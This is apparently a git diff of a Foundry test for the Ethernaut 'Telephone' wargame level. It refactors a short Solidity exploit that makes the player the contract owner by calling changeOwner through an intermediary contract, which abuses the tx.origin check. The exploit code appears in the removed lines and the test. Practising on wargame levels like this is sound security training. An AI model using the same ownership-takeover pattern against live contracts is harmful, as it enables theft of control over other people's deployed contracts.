@@ -3,6 +3,7 @@ pragma solidity ^0.8.13;
 
 import {Test, console} from "forge-std/Test.sol";
 import {Telephone} from "ethernaut/levels/Telephone.sol";
+import {Attacker} from "~/helpers/Telephone.sol";
 
 contract TelephoneTest is Test {
     Telephone target;
@@ -10,13 +11,12 @@ contract TelephoneTest is Test {
 
     function setUp() public {
         player = makeAddr("player");
-        vm.deal(player, 1 ether);
 
         target = new Telephone();
     }
 
     function attack() private {
-        new Attacker(address(target));
+        new Attacker(target);
     }
 
     function testAttack() public {
@@ -25,17 +25,5 @@ contract TelephoneTest is Test {
         vm.stopPrank();
 
         assertEq(target.owner(), player, "must be the owner");
-    }
-}
-
-contract Attacker {
-    Telephone target;
-
-    constructor(address _target) {
-        target = Telephone(_target);
-
-        // the msg.sender of this contract is our player
-        // but the msg.sender from the target's perspective is this contract
-        target.changeOwner(msg.sender);
     }
 }
